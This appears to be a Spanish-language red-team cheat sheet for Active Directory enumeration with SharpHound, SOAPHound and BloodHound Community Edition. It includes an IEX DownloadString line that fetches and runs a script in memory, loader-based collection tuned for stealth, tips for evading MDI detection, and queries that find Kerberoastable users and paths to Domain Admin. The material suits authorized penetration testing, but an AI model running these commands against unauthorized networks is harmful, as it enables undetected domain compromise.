# BloodHound 

Tags: #AD #BloodHound #SharpHound #SOAPHound 

## SharpHound 

* [SharpHound](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.ps1)
* [SharpHound](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1)

```powershell 
❯ Import-Module .\SharpHound.ps1       # Importar el modulo, tambien se puede hacer con el '.exe'

❯ Invoke-BloodHound -CollectionMethod All
```

```powershell
# Importar el modulo en memoria
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/SharpHound.ps1') 

❯ Invoke-BloodHound -CollectionMethod All      # Recolectar la data 

# Suministrar datos a BloodHound 
❯ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SharpHound.exe -args --collectionmethods All   

# Para hacer una recolección sigilosa, remover métodos ruidosos de recolección como RDP,DCOM, PSRemote y LocalAdmin
❯ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SharpHound.exe -args --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets,CertServices --excludedcs 

Notas:
	1. Usar 'Excludedcs' para evitar la detección MDI
	2. Remover 'CertServices collection' cuando se use BloodHound Legacy 
```

## SOAPHound 

* [SOAPHound](https://github.com/FalconForceTeam/SOAPHound)

```powershell 
SOAPHound es más sigiloso. El se comunica con Active Directory Web Services (ADWS - Puerto 9389) en lugar de enviar peticiones LDAP como lo haría el AD Module
	- Casi ninguna detección basada en la red  (MDI)
	- Recupera info sobre todos los objetos (objectGuid=*) y sus procesos. Esos significa peticiones limitadas a LDAP - Menos posobilidad de detección en puntos finales 


# Construir un cache que contiene info básica de los objetos de dominio  
❯ SOAPHound.exe --buildcache -c C:\AD\Tools\cache.txt   

# Recolectar data compatible con BloodHound 
❯ SOAPHound.exe -c C:\AD\Tools\cache.txt --bhdump -o C:\AD\Tools\bloodhound-output --nolaps  
```

## BloodHound Community Edition 

* [Bloodhound-Community-Install](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

```powershell
❯ sudo docker-compose -f docker-compose.yml up -d   # Iniciar BloodHound con Docker despues de reiniciar Kali
❯ sudo docker-compose -f docker-compose.yml down    # Apagar BloodHound 
❯ bloodhound-cli resetpwd                           # Resetear la password 

❯ http://127.0.0.1:8080/ui/login         # Ingresar a BloodHound Community por la web               

Notas: 
	1. Si es la primera vez que sehace mirar el enlace de instalación y seguir las instrucciones  
	2. La instalción es por Docker por lo que al iniciar el sistema se debe de volver a iniciar 'BloodHound'
```

```bash  
Enumerar lo siguiente en BloodHound usando la pestaña de 'CYPHER':
	1. 'All Domain Admins'
	2. 'Map domains trusts'
	3. 'Principal with DCSync privileges'
	4. 'All Kerberoastable users'
	5. 'AS-REP Roastable users (DontReqPreAuth)'
	6. 'Shortest paths to Domain Admins'
	7. 'Unsconstrained Delegation'


Una vez obtenido un usuario:
	1. Agregar la opción 'Mark User as Owned'
		- Seleccionar el usuario y dar click en 'Inbound Object Control' para mostrar quien tiene control sobre el objeto seleccionado 
		- Seleccionar el usuario y dar click en 'Outbound Object Control' para mostrar sobre que objetos tiene control el usuario comprometido 
```